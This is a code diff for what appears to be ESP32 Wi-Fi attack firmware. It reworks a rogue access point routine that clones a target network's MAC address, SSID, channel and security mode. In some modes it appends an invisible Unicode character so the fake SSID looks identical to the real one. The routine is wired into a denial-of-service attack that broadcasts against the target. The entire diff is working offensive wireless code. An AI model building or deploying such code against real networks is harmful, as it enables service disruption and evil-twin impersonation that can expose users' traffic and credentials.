@@ -66,21 +66,76 @@ static void ip_event_handler(void* arg, esp_event_base_t event_base,
         ESP_LOGI(TAG, "---------------------------------");
     }
 }
+void attack_method_rogueap(const attack_config_t *attack_config, int mode)
+{
+    wifi_config_t ap_config = {0};
+    const wifi_ap_record_t *ap_record = attack_config->ap_record;
+    const char *password = attack_config->password;
+    bool hidden = attack_config->hidden;
 
-void attack_method_rogueap(const wifi_ap_record_t *ap_record){
     ESP_LOGD(TAG, "Configuring Rogue AP");
-    wifictl_set_ap_mac(ap_record->bssid);
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid_len = strlen((char *)ap_record->ssid),
-            .channel = ap_record->primary,
-            .authmode = ap_record->authmode,
-            .password = "dummypassword",
-            .max_connection = 4
-        },
-    };
-    mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
+
+    if (mode == 0) { // pure deauth
+        ESP_LOGI(TAG, "Setting MAC address: %02X:%02X:%02X:%02X:%02X:%02X",
+                 ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
+                 ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
+        wifictl_set_ap_mac((uint8_t *)ap_record->bssid);
+    }
+
+    char ssid_with_char[33];
+    size_t src_len = strlen((char *)ap_record->ssid);
+
+    if (mode != 0) {
+        // U+3164 in UTF-8 is 3 bytes
+        const char *u3164_utf8 = "\xE3\x85\xA4";
+        // Ensure room for the 3-byte sequence and NUL (max SSID bytes = 32)
+        if (src_len > 29) src_len = 29; // leave room for 3 bytes
+        memcpy(ssid_with_char, ap_record->ssid, src_len);
+        // append the 3-byte utf-8 char (safe copy)
+        memcpy(ssid_with_char + src_len, u3164_utf8, 3);
+        ssid_with_char[src_len + 3] = '\0';
+    } else {
+        // mode == 0: use SSID as-is (truncate to 32 bytes if necessary)
+        if (src_len > 32) src_len = 32;
+        memcpy(ssid_with_char, ap_record->ssid, src_len);
+        ssid_with_char[src_len] = '\0';
+    }
+
+    memset(ap_config.ap.ssid, 0, sizeof(ap_config.ap.ssid));
+    memcpy(ap_config.ap.ssid, ssid_with_char, strlen(ssid_with_char));
+    ap_config.ap.ssid_len = (uint8_t)strlen(ssid_with_char);
+
+    ap_config.ap.channel = ap_record->primary;
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.ssid_hidden = hidden;
+
+    if (ap_record->authmode == WIFI_AUTH_OPEN) {
+        ap_config.ap.authmode = WIFI_AUTH_OPEN;
+        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
+    } else {
+        ap_config.ap.authmode = ap_record->authmode;
+        strncpy((char *)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
+    }
+
+    /* enforce password length for non-open networks */
+    if (ap_config.ap.authmode != WIFI_AUTH_OPEN) {
+        size_t pass_len = strlen((char *)ap_config.ap.password);
+        if (pass_len < 8) {
+            ESP_LOGW(TAG, "Password too short (%u chars) — using dummy password", (unsigned)pass_len);
+            strncpy((char *)ap_config.ap.password, "12345678", sizeof(ap_config.ap.password) - 1);
+        }
+    }
+
+    /* sanitize authmode for SoftAP */
+    if (ap_config.ap.authmode == WIFI_AUTH_WEP || ap_config.ap.authmode >= WIFI_AUTH_MAX) {
+        ESP_LOGW(TAG, "Invalid authmode %d for SoftAP; defaulting to WPA2_PSK", ap_config.ap.authmode);
+        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    }
+
     wifictl_ap_start(&ap_config);
+
+    ESP_LOGI(TAG, "AP started (SSID='%s', Channel %d, Hidden: %s, Authmode: %d)",
+             ssid_with_char, ap_config.ap.channel, hidden ? "Yes" : "No", ap_config.ap.authmode);
 }
 
 static attack_dos_methods_t method = -1;
@@ -89,7 +144,7 @@ void attack_dos_start(attack_config_t *attack_config) {
     ESP_LOGI(TAG, "Starting DoS attack...");
     method = attack_config->method;
     ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
-            attack_method_rogueap(attack_config->ap_record);
+            attack_method_rogueap(attack_config, 0);
             attack_method_broadcast(attack_config->ap_record, 1);
 }
 
